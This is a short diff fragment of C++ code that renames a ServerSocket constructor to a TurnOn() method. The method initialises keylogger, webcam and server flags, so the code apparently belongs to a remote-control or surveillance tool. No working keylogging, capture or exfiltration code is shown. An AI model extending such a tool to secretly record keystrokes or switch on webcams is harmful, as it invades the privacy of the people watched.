@@ -101,7 +101,7 @@ void ServerSocket::ProcessClientMessage() {
 		result = "Y";
 	}
 }
-ServerSocket::ServerSocket() {
+void ServerSocket::TurnOn() {
 	isKeyloggerOn = false;
 	isWebcamOn = false;
 	isServerOn = true;
